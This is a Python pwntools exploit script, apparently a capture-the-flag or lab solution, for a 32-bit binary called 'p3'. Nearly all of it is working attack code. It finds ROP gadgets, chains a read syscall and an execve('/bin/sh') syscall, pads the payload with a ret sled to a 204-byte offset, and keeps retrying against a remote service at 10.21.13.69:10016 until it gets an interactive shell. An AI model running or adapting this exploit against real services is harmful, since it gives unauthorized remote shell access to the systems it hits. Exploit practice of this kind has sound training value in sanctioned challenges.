#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#local = 0
#if local:
#	p = process('./p3')
#else:
#	p = remote('10.21.13.69', 10016)
elf = ELF('./p3')
g = lambda x: next(elf.search(asm(x)))
ret = g('ret')
info('ret = ' + hex(ret))
pop_eax_ret = g('pop eax ; ret')
pop_ebx_ret = g('pop ebx ; ret')
pop_ecx_ret = g('pop ecx ; ret')
pop_edx_ret = g('pop edx ; ret')
int_0x80_ret = g('int 0x80 ; ret') 
buf = 0x080eb000 - 100
# gdb.attach(p)
offset = 204
# read(0, '/bin/sh\x00', 100)
rop1 = [
	pop_eax_ret, 
	3, 
	pop_ebx_ret, 
	0, 
	pop_ecx_ret, 
	buf, 
	pop_edx_ret, 
	100, 
	int_0x80_ret, 
]
# execve('/bin/sh\x00', 0, 0)
rop2 = [
	pop_eax_ret, 
	0xb, 
	pop_ebx_ret, 
	buf, 
	pop_ecx_ret, 
	0, 
	pop_edx_ret, 
	0, 
	int_0x80_ret
]
rop = ''.join(map(p32, rop1 + rop2))
info('len(rop) = ' + str(len(rop)))
offset2 = offset - len(rop)
info('offset2 = ' + str(offset2))
payload = p32(ret) * (offset2 / 4) + rop
info('len(payload) = ' + str(len(payload)))
while True:
	p = remote('10.21.13.69', 10016)
	# payload = cyclic(500)
	try:
		p.sendline(payload)
		p.sendline('/bin/sh\x00')
	except Exception:
		p.close()
	else:
		p.interactive()
